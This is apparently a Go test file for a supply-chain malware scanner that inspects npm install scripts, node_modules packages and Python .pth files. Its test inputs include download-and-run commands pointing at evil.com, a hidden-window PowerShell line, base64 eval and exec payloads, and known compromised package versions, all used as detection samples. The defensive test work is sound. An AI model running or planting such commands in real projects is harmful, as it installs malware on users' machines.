package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func TestAnalyzeScript(t *testing.T) {
	tests := []struct {
		script string
		want   int // minimum number of flags
	}{
		{"node index.js", 0},
		{"curl -o /tmp/payload http://evil.com && chmod +x /tmp/payload", 1},
		{"powershell -ExecutionPolicy Bypass -WindowStyle Hidden", 3},
		{"eval(atob('base64stuff'))", 2},
		{"nohup python3 /tmp/ld.py > /dev/null 2>&1 &", 2},
		{"node setup.js", 0},
	}

	for _, tt := range tests {
		flags := analyzeScript(tt.script)
		if len(flags) < tt.want {
			t.Errorf("analyzeScript(%q) returned %d flags, want >= %d (got: %v)",
				tt.script, len(flags), tt.want, flags)
		}
	}
}

func TestCheckFileObfuscation(t *testing.T) {
	dir := t.TempDir()

	// Clean file
	clean := filepath.Join(dir, "clean.js")
	os.WriteFile(clean, []byte(`console.log("hello world");`), 0644)
	if flags := checkFileObfuscation(clean); len(flags) != 0 {
		t.Errorf("clean file flagged: %v", flags)
	}

	// Obfuscated file
	obf := filepath.Join(dir, "obf.js")
	content := `var a = eval(atob("` + repeatStr("\\x41", 25) + `"));`
	content += "\nvar b = Buffer.from(x, 'base64'); Buffer.from(y, 'base64'); Buffer.from(z, 'base64'); Buffer.from(w, 'base64');"
	os.WriteFile(obf, []byte(content), 0644)
	flags := checkFileObfuscation(obf)
	if len(flags) == 0 {
		t.Error("obfuscated file not flagged")
	}
}

func TestPhantomDependency(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// Create a phantom dependency
	phantomDir := filepath.Join(nm, "plain-crypto-js")
	os.MkdirAll(phantomDir, 0755)
	writePackageJSON(t, phantomDir, "plain-crypto-js", "4.2.1")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	found := false
	for _, f := range s.Findings {
		if f.Check == "phantom-dependency" {
			found = true
			break
		}
	}
	if !found {
		t.Error("phantom dependency not detected")
	}
}

func TestCompromisedVersion(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	axiosDir := filepath.Join(nm, "axios")
	os.MkdirAll(axiosDir, 0755)
	writePackageJSON(t, axiosDir, "axios", "1.14.1")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("compromised version not detected")
	}
}

func TestVersionMismatch(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// Create a package whose name doesn't match its directory
	pkgDir := filepath.Join(nm, "plain-crypto-js")
	os.MkdirAll(pkgDir, 0755)
	// package.json says it's version 4.2.0 and name doesn't match dir... actually
	// the real attack was the name matched but the version was swapped.
	// Let's test name mismatch: dir is "lodash" but package.json says "evil-pkg"
	mismatchDir := filepath.Join(nm, "lodash")
	os.MkdirAll(mismatchDir, 0755)
	writePackageJSON(t, mismatchDir, "evil-pkg", "1.0.0")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	found := false
	for _, f := range s.Findings {
		if f.Check == "package-name-mismatch" {
			found = true
			break
		}
	}
	if !found {
		t.Error("package name mismatch not detected")
	}
}

func TestCleanScan(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// Create a clean package
	pkgDir := filepath.Join(nm, "express")
	os.MkdirAll(pkgDir, 0755)
	writePackageJSON(t, pkgDir, "express", "4.18.2")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	if len(s.Findings) != 0 {
		t.Errorf("clean scan produced findings: %v", s.Findings)
	}
}

func TestMaliciousPthFile(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(sp, 0755)

	// Known malicious .pth file
	os.WriteFile(filepath.Join(sp, "litellm_init.pth"), []byte("import os; os.system('curl ...')"), 0644)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "malicious-pth-file" {
			found = true
			break
		}
	}
	if !found {
		t.Error("malicious .pth file not detected")
	}
}

func TestSuspiciousPthFile(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(sp, 0755)

	// Unknown .pth file with multiple suspicious patterns
	os.WriteFile(filepath.Join(sp, "sneaky.pth"), []byte("import subprocess; exec(base64.b64decode('payload'))"), 0644)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "suspicious-pth-file" {
			found = true
			break
		}
	}
	if !found {
		t.Error("suspicious .pth file not detected")
	}
}

func TestCleanPthFile(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(sp, 0755)

	// Normal .pth file (just a path)
	os.WriteFile(filepath.Join(sp, "my_package.pth"), []byte("/opt/my_package\n"), 0644)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	if len(s.Findings) != 0 {
		t.Errorf("clean .pth file produced findings: %v", s.Findings)
	}
}

func TestCompromisedPythonVersion(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(filepath.Join(sp, "litellm-1.82.7.dist-info"), 0755)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-python-version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("compromised Python version not detected")
	}
}

func TestCleanPythonVersion(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(filepath.Join(sp, "litellm-1.82.6.dist-info"), 0755)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	if len(s.Findings) != 0 {
		t.Errorf("clean Python version produced findings: %v", s.Findings)
	}
}

func TestPythonUnderscoreNormalization(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	// PyPI sometimes uses underscores in dist-info directory names
	os.MkdirAll(filepath.Join(sp, "litellm-1.82.8.dist-info"), 0755)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-python-version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("compromised Python version with underscore normalization not detected")
	}
}

func TestAnalyzePthContent(t *testing.T) {
	tests := []struct {
		content string
		want    int
	}{
		{"/opt/my_package\n", 0},
		{"import subprocess; subprocess.call(['curl', 'http://evil.com'])", 1},
		{"import os; exec(base64.b64decode('...'))", 2},
		{"./local_path\n../relative\n", 0},
	}

	for _, tt := range tests {
		flags := analyzePthContent(tt.content)
		if len(flags) < tt.want {
			t.Errorf("analyzePthContent(%q) returned %d flags, want >= %d (got: %v)",
				tt.content, len(flags), tt.want, flags)
		}
	}
}

func writePackageJSON(t *testing.T, dir, name, version string) {
	t.Helper()
	pkg := packageJSON{
		Name:    name,
		Version: version,
		Scripts: map[string]string{},
	}
	data, _ := json.Marshal(pkg)
	os.WriteFile(filepath.Join(dir, "package.json"), data, 0644)
}

func repeatStr(s string, n int) string {
	result := ""
	for i := 0; i < n; i++ {
		result += s
	}
	return result
}
